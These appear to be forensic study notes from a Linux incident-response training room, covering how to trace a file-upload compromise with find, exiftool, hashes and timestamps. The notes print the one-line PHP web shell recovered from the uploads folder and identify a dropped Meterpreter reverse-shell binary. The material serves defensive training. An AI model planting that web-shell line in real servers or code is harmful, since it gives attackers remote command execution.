# 02 — Files, Permissions & Timestamps

## Identifying the foothold
The web server was vulnerable to a file-upload vuln, so check the web directories and uploaded files.

```bash
ls -al /var/www/html/
ls -al /var/www/html/uploads
```
Lots of random-named `.jpeg` files owned by `www-data`. Filter out the images to find the odd one out:
```bash
ls -al /var/www/html/uploads | grep -v ".jpeg"
```
That surfaced a `.phtml` file — a web shell:
```bash
cat /var/www/html/uploads/b2c8e1f5.phtml
# <?php system($_GET['cmd']);?>
```
The unsafe `system()` call lets the attacker run arbitrary commands remotely — the foothold. Correlate with the web server logs (Apache/Nginx) to tie the request back to the attacker.

## Ownership and permissions
The web shell is owned by `www-data` (the web-server process user), so investigate other activity and files owned by `www-data`. Attackers target writable directories:
- `/tmp` — writable by all users.
- `/var/tmp` — commonly world-writable.
- `/dev/shm` — shared memory fs, normally writable by all.

```bash
# Files owned by www-data, from root down
find / -user www-data -type f 2>/dev/null | less
```
This turned up `reverse.elf` in `/var/www/html/assets/`, executable by all (`-rwxr-xr-x`):
```bash
ls -l /var/www/html/assets/reverse.elf
```

Other useful `find` queries from the room:
```bash
find / -group GROUPNAME 2>/dev/null      # files/dirs owned by a group
find / -perm -o+w 2>/dev/null            # all world-writable files/dirs
find / -type f -cmin -5 2>/dev/null      # files created/changed in last 5 min
```
`2>/dev/null` suppresses permission-denied noise.

## Metadata (exiftool)
ExifTool parses file headers/embedded metadata — type, size, permissions, architecture, timestamps, sometimes author.
```bash
exiftool /var/www/html/assets/reverse.elf
```
`reverse.elf` is an ELF 64-bit AMD x86-64 executable. Its MIME type is `application/octet-stream`.

## Checksums
Hashes for integrity and for matching known-malicious files.
```bash
md5sum  /var/www/html/assets/reverse.elf
sha256sum /var/www/html/assets/reverse.elf
```
Submitting the hash to VirusTotal flagged it as a **Meterpreter reverse shell** — the attacker used the initial RCE to drop and run `reverse.elf` for an interactive reverse shell.

## Timestamps
Three Unix timestamps:
- **mtime** — contents last modified → `ls -l <file>`
- **ctime** — metadata (perms/ownership/name) last changed → `ls -lc <file>`
- **atime** — last accessed/read → `ls -lu <file>`

`atime` is unreliable in live analysis — reading the file with exiftool/md5sum/cat updates it. That's why forensically sound backups come first.

See all three at once:
```bash
stat /var/www/html/assets/reverse.elf
```
`stat` shows Access / Modify / Change (and Birth, if available), which is what you build a timeline from.
